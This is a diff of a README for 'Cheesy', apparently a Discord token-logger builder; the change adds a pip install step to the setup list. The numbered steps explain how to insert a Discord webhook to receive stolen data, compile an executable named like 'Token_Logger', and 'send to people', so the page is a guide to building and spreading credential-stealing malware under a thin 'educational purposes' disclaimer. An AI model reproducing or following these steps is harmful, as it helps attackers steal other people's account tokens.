@@ -62,11 +62,12 @@ Cheesy was made for educational purposes, therefore all consequences caused by y
 
 1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
 2. Open up [main.py](https://github.com/bananaman2020/cheesy/blob/master/main.py) with notepad or some other editor
-3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
-4. Double Click `setup.bat` and allow it to finish.
-5. Download Visual Studio Community 2022 and get the C++ Development Feature Pack during the installer screen
-6. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
-7. Wait for the process to complete and then get the file that was made in the downloaded folder and send to people :)
+3. Open CMD or Powershell and cd into the directory where you cloned the repo and run `pip install -r requirements. txt`
+4. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
+5. Double Click `setup.bat` and allow it to finish.
+6. Download Visual Studio Community 2022 and get the C++ Development Feature Pack during the installer screen
+7. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
+8. Wait for the process to complete and then get the file that was made in the downloaded folder and send to people :)
 
 ## <a id="config"></a>⚙ 〢 Config
 
